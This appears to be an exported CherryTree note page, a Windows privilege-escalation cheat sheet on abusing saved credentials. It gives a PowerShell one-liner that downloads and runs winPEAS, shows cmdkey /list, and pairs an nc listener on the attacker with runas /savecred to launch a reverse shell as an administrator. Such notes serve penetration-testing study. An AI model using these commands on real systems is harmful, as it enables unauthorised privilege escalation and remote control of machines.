<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Saved Creds</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Saved Creds</h1><br/><br />• Windows has a runas command which allows users to run commands with the privileges of other users.<br />• This usually requires the knowledge of the other user’s password.<br />• However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.<br /><br />0. WinPEAS generally check for service misconfigurations:  <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe quiet cmd windowscreds&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>;</pre></div> <br />    <a href=""><img src="images/1329-1.png" alt="images/1329-1.png" /></a><br />    <span style="color:#ff0000;">WARNING</span>: how we can see the tool does not always work better verify manually(next step)<br /><br />1. Check saved credentials manually<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> cmdkey <span style="color:#ff9d00;font-weight:700">/</span>list</pre></div><br />    <a href=""><img src="images/1329-2.png" alt="images/1329-2.png" /></a>      <br /><br />2. We can use the saved credential to run any command as the admin user. <br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -nvlp 53   <span style="color:#0088ff;font-weight:400"># start a listener on the attacker</span></pre></div><br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> runas <span style="color:#ff9d00;font-weight:700">/</span>savecred <span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">:</span>&lt;AdminUserTarget&gt; &lt;PathReverseShell&gt;</pre></div><br />    <a href=""><img src="images/1329-3.png" alt="images/1329-3.png" /></a><br />    <a href=""><img src="images/1329-4.png" alt="images/1329-4.png" /></a><br /><br /><br /><br />Bibliography:<br />• <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault</a></div>
</body>
</html>
